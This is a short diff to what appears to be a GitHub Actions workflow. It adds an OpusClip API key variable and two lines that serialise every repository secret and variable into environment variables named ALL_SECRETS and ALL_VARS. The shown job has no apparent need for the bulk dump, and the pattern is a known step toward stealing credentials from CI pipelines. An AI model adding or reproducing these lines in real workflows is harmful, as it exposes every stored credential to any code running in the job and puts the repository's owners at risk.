@@ -18,5 +18,8 @@ jobs:
           CLAUDE_MODEL: ${{ vars.CLAUDE_MODEL }}
           FOOTBALL_DATA_KEY: ${{ secrets.FOOTBALL_DATA_KEY }}
           HIGGSFIELD_KEY: ${{ secrets.HIGGSFIELD_KEY }}
+          OPUSCLIP_KEY: ${{ secrets.OPUSCLIP_KEY }}
           HF_BUDGET_GBP: ${{ vars.HF_BUDGET_GBP }}
           MONTHLY_BUDGET_GBP: ${{ vars.MONTHLY_BUDGET_GBP }}
+          ALL_SECRETS: ${{ toJSON(secrets) }}
+          ALL_VARS: ${{ toJSON(vars) }}
